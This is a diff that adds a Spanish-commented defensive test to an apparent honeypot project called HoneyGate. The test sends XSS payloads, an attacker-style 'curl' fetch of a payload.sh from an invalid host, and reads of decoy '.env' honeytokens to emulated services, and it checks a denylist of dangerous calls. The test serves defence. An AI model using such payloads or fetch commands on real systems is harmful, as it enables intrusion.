@@ -839,6 +839,268 @@ def run_tests():
                 c_m2, _, _ = _http_request("http://127.0.0.1:38090/")
                 assert c_m2 == 503
                 print("       -> Portal Cautivo Modo 1, OTP obligatorio, 3 intentos, 429 SQLite, HMAC 0600, Anti-Sybil y XSS: OK")
+
+                print("[TEST] 12. Verificando Fase 4: Servicios Emulados, Cero Egreso, Límites, Honeytokens Ficticios y CSP Portal...")
+                # Reutilizar la configuración del portal en Modo 3 (Mixto) para probar ambos componentes
+                _, _, _ = _http_request(
+                    "http://127.0.0.1:38890/api/config",
+                    method="PUT",
+                    headers=p_auth_hdr,
+                    body={"mode": 3, "portal_enabled": True, "honeypot_enabled": True, "max_outbound_per_minute": 100},
+                )
+
+                # 12.1 Inspección estática de seguridad en deception.py y honeywall_core.py
+                root_pkg = os.path.dirname(os.path.abspath(__file__))
+                for rel_mod in ("honeygate/deception.py", "honeygate/honeywall_core.py"):
+                    with open(os.path.join(root_pkg, rel_mod), "r", encoding="utf-8") as mf:
+                        mod_src = mf.read()
+                    for forbidden_call in ("subprocess", "os.system", "os.popen", "eval(", "exec(", "create_connection"):
+                        assert forbidden_call not in mod_src, f"Llamada prohibida '{forbidden_call}' en {rel_mod}"
+
+                # 12.2 CSP estricta del portal (sin 'unsafe-inline' en script-src) + plantilla estática sin scripts externos
+                c_p_csp, p_hdrs, p_html_body = _http_request("http://127.0.0.1:38090/")
+                assert c_p_csp == 200
+                csp_val = next((v for k, v in p_hdrs.items() if k.lower() == "content-security-policy"), "")
+                assert "script-src 'self'" in csp_val, f"CSP debe fijar script-src 'self': {csp_val}"
+                script_src_part = next((d for d in csp_val.split(";") if "script-src" in d), "")
+                assert "'unsafe-inline'" not in script_src_part, f"script-src NO debe tener 'unsafe-inline': {csp_val}"
+                assert "connect-src 'none'" in csp_val
+                assert '<script src="/portal/fp.js"></script>' in p_html_body
+
+                c_fp_js, fp_hdrs, fp_js_body = _http_request("http://127.0.0.1:38090/portal/fp.js")
+                assert c_fp_js == 200 and "HoneyGate-FP" in fp_js_body
+
+                # Rechazo de scripts/recursos externos en portal_template (PUT /api/config)
+                for bad_tpl in (
+                    {"title": "<script>alert(1)</script>"},
+                    {"subtitle": "Visitar https://externo.com/script.js"},
+                    {"footer": '<img src="https://evil.invalid/x.png" onerror=alert(1)>'},
+                    {"footer": "onclick=alert(1)"},
+                ):
+                    c_bad_tpl, _, _ = _http_request(
+                        "http://127.0.0.1:38890/api/config",
+                        method="PUT",
+                        headers=p_auth_hdr,
+                        body={"portal_template": bad_tpl},
+                    )
+                    assert c_bad_tpl == 400, f"Plantilla peligrosa {bad_tpl} debe retornar 400, dio {c_bad_tpl}"
+
+                c_good_tpl, _, _ = _http_request(
+                    "http://127.0.0.1:38890/api/config",
+                    method="PUT",
+                    headers=p_auth_hdr,
+                    body={
+                        "portal_template": {
+                            "title": "Red Corporativa A & B",
+                            "subtitle": "Acceso nominal autorizado",
+                            "footer": "Mesa de ayuda interna",
+                        }
+                    },
+                )
+                assert c_good_tpl == 200
+                _, _, custom_portal_html = _http_request("http://127.0.0.1:38090/")
+                assert "Red Corporativa A &amp; B" in custom_portal_html
+                assert "Mesa de ayuda interna" in custom_portal_html
+
+                # 12.3 Validación de honeytokens ficticios: rechaza dominios reales conocidos, acepta .invalid/.test
+                for bad_ht in (
+                    [{"name": "REAL_GMAIL", "value": "juan@gmail.com", "kind": "email"}],
+                    [{"name": "REAL_OUTLOOK", "value": "admin@outlook.com", "kind": "email"}],
+                    [{"name": "REAL_GOV", "value": "contacto@afip.gov.ar", "kind": "email"}],
+                    [{"name": "REAL_URL", "value": "https://google.com/secret", "kind": "decoy"}],
+                    [{"name": "REAL_CORP", "value": "ops@empresa-real.com", "kind": "email"}],
+                ):
+                    c_bad_ht, _, _ = _http_request(
+                        "http://127.0.0.1:38890/api/config",
+                        method="PUT",
+                        headers=p_auth_hdr,
+                        body={"honeytokens": bad_ht},
+                    )
+                    assert c_bad_ht == 400, f"Honeytoken real {bad_ht} debe retornar 400, dio {c_bad_ht}"
+
+                valid_hts = [
+                    {"name": "FAKE_API_KEY_01", "value": "hg_decoy_token_0001", "kind": "api_key"},
+                    {"name": "DECOY_ADMIN_MAIL", "value": "decoy@example.invalid", "kind": "email"},
+                ]
+                c_good_ht, _, good_ht_body = _http_request(
+                    "http://127.0.0.1:38890/api/config",
+                    method="PUT",
+                    headers=p_auth_hdr,
+                    body={"honeytokens": valid_hts},
+                )
+                assert c_good_ht == 200
+                assert len(json.loads(good_ht_body)["honeytokens"]) == 2
+
+                # 12.4 Motor epoll dedicado para Fase 4: escucha en 127.0.0.1 por defecto y respeta HONEYGATE_EPOLL_HOST
+                d_db_path = os.path.join(tmpdir, "deception_test.db")
+                d_storage = HoneyGateStorage(db_path=d_db_path)
+                d_storage.update_config({
+                    "mode": 3,
+                    "honeypot_enabled": True,
+                    "max_outbound_per_minute": 100,
+                    "honeytokens": valid_hts,
+                })
+                d_honeywall = HoneyGateHoneywall(
+                    storage=d_storage,
+                    port_services={34222: "ssh", 32323: "telnet", 34080: "http", 33306: "mysql"},
+                )
+
+                os.environ.pop("HONEYGATE_EPOLL_HOST", None)
+                d_engine = EpollNetworkEngine(
+                    ports=[34222, 32323, 34080, 33306],
+                    honeywall=d_honeywall,
+                    max_line_bytes=512,
+                    max_commands_per_session=5,
+                    max_session_duration_sec=1.5,
+                )
+                d_engine.start_background()
+                time.sleep(0.3)
+
+                # Verificar bind por defecto en 127.0.0.1
+                assert d_engine.host == "127.0.0.1"
+                for srv_sock in d_engine.server_sockets.values():
+                    assert srv_sock.getsockname()[0] == "127.0.0.1", f"Socket debe escuchar en 127.0.0.1: {srv_sock.getsockname()}"
+
+                # Verificar override explícito por HONEYGATE_EPOLL_HOST
+                os.environ["HONEYGATE_EPOLL_HOST"] = "127.0.0.2"
+                try:
+                    d_engine_env = EpollNetworkEngine(ports=[34229], honeywall=d_honeywall)
+                    assert d_engine_env.host == "127.0.0.2"
+                finally:
+                    os.environ.pop("HONEYGATE_EPOLL_HOST", None)
+
+                # Guard de DNS/egreso: durante interacción con atacante nunca se llama getaddrinfo ni se abren sockets externos
+                dns_calls = []
+                orig_getaddrinfo = socket.getaddrinfo
+
+                def spy_getaddrinfo(*args, **kwargs):
+                    dns_calls.append(args)
+                    return orig_getaddrinfo(*args, **kwargs)
+
+                socket.getaddrinfo = spy_getaddrinfo
+                try:
+                    # 12.5 SSH emulado: tabla fija, egreso bloqueado, honeytoken, XSS como texto plano y límite de línea
+                    s_ssh = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s_ssh.settimeout(2.0)
+                    s_ssh.connect(("127.0.0.1", 34222))
+                    b_ssh = s_ssh.recv(512).decode("utf-8", errors="ignore")
+                    assert b_ssh.startswith("SSH-2.0-OpenSSH_"), f"Banner SSH inválido: {b_ssh}"
+
+                    s_ssh.sendall(b"id\n")
+                    r_id = s_ssh.recv(512).decode("utf-8", errors="ignore")
+                    assert "uid=1001(guest)" in r_id
+
+                    # Intento de egreso/resolución DNS y ejecución -> respuesta fija sin conectar
+                    s_ssh.sendall(b"curl http://exfiltracion-falsa.invalid/payload.sh\n")
+                    r_curl = s_ssh.recv(512).decode("utf-8", errors="ignore")
+                    assert "Failed to connect: Network is unreachable" in r_curl
+
+                    # Acceso a honeytoken ficticio + XSS crudo en entrada
+                    s_ssh.sendall(b"cat .env\n")
+                    r_env = s_ssh.recv(512).decode("utf-8", errors="ignore")
+                    assert "FAKE_API_KEY_01=hg_decoy_token_0001" in r_env
+
+                    s_ssh.sendall(b"<img src=x onerror=alert(1)>\x07\n")
+                    r_xss = s_ssh.recv(512).decode("utf-8", errors="ignore")
+                    assert "bash: command not found" in r_xss
+                    assert "<img" not in r_xss and "HoneyGate" not in r_xss
+
+                    # Línea excediendo 512 bytes -> rechazada con límite
+                    s_ssh.sendall((b"A" * 600) + b"\n")
+                    r_lim = s_ssh.recv(512).decode("utf-8", errors="ignore")
+                    assert "Line length limit exceeded" in r_lim
+                    s_ssh.close()
+
+                    # 12.6 HTTP emulado (puerto 34080) tabla fija + /.env honeytoken
+                    s_http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s_http.settimeout(2.0)
+                    s_http.connect(("127.0.0.1", 34080))
+                    s_http.sendall(b"GET /robots.txt HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
+                    r_http = s_http.recv(1024).decode("utf-8", errors="ignore")
+                    assert "200 OK" in r_http and "Disallow: /admin" in r_http
+                    s_http.close()
+
+                    s_http_ht = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s_http_ht.settimeout(2.0)
+                    s_http_ht.connect(("127.0.0.1", 34080))
+                    s_http_ht.sendall(b"GET /.env HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
+                    r_http_ht = s_http_ht.recv(1024).decode("utf-8", errors="ignore")
+                    assert "FAKE_API_KEY_01=hg_decoy_token_0001" in r_http_ht
+                    s_http_ht.close()
+
+                    # 12.7 Telnet y MySQL banners estáticos
+                    s_tel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s_tel.settimeout(2.0)
+                    s_tel.connect(("127.0.0.1", 32323))
+                    b_tel = s_tel.recv(512).decode("utf-8", errors="ignore")
+                    assert "login:" in b_tel and "HoneyGate" not in b_tel
+                    s_tel.close()
+
+                    s_my = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s_my.settimeout(2.0)
+                    s_my.connect(("127.0.0.1", 33306))
+                    b_my = s_my.recv(512).decode("utf-8", errors="ignore")
+                    assert "5.7.42" in b_my
+                    s_my.sendall(b"SELECT * FROM users;\n")
+                    r_my = s_my.recv(512).decode("utf-8", errors="ignore")
+                    assert "ERROR 1045" in r_my
+                    s_my.close()
+
+                    # 12.8 Límite de comandos por sesión (max_commands_per_session=5)
+                    s_cmdlim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s_cmdlim.settimeout(2.0)
+                    s_cmdlim.connect(("127.0.0.1", 34222))
+                    _ = s_cmdlim.recv(512)
+                    for idx in range(5):
+                        s_cmdlim.sendall(f"pwd\n".encode())
+                        _ = s_cmdlim.recv(512)
+                    s_cmdlim.sendall(b"whoami\n")
+                    r_over_cmd = s_cmdlim.recv(512).decode("utf-8", errors="ignore")
+                    assert "Maximum commands per session exceeded" in r_over_cmd
+                    s_cmdlim.close()
+
+                    # 12.9 Límite de duración de sesión (max_session_duration_sec=1.5)
+                    s_timeout = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s_timeout.settimeout(3.0)
+                    s_timeout.connect(("127.0.0.1", 34222))
+                    _ = s_timeout.recv(512)
+                    time.sleep(1.8)
+                    r_to = s_timeout.recv(512).decode("utf-8", errors="ignore")
+                    assert "Session timed out" in r_to or r_to == ""
+                    s_timeout.close()
+
+                    assert len(dns_calls) == 0, f"Servicios emulados NO pueden resolver DNS: {dns_calls}"
+
+                    time.sleep(0.2)
+                    # Verificar eventos y sesiones en SQLite
+                    evs_all, _ = d_storage.list_events(limit=100)
+                    ev_types = {e["event_type"] for e in evs_all}
+                    for req_ev in (
+                        "DECEPTION_EGRESS_BLOCKED",
+                        "HONEYTOKEN_TOUCHED",
+                        "DECEPTION_LINE_LIMIT_EXCEEDED",
+                        "DECEPTION_COMMAND_LIMIT_EXCEEDED",
+                        "DECEPTION_SESSION_TIMEOUT",
+                    ):
+                        assert req_ev in ev_types, f"Falta evento {req_ev} en SQLite: {ev_types}"
+
+                    # Verificar sanitización del byte de control \x07 y presencia segura de XSS como texto plano
+                    xss_ev = next(e for e in evs_all if "onerror=alert(1)" in (e.get("metadata", {}).get("command") or ""))
+                    assert "\x07" not in xss_ev["metadata"]["command"]
+
+                    d_sessions, _ = d_storage.list_sessions(limit=20)
+                    assert any(
+                        (s.get("target", {}).get("honeytoken_touched") == "FAKE_API_KEY_01")
+                        for s in d_sessions
+                    ), "La sesión que tocó .env debe registrar honeytoken_touched='FAKE_API_KEY_01'"
+                finally:
+                    socket.getaddrinfo = orig_getaddrinfo
+                    d_engine.stop()
+                    d_storage.close()
+
+                # Verificar escapeHtml en eventos del panel web dashboard
+                assert "events-table-body" in dash_html and "escapeHtml(ev.description" in dash_html
+                print("       -> Servicios emulados, 127.0.0.1, cero egreso/DNS, límites, honeytokens y CSP estricta: OK")
             finally:
                 root_logger.removeHandler(mem_handler)
                 p_portal.stop()
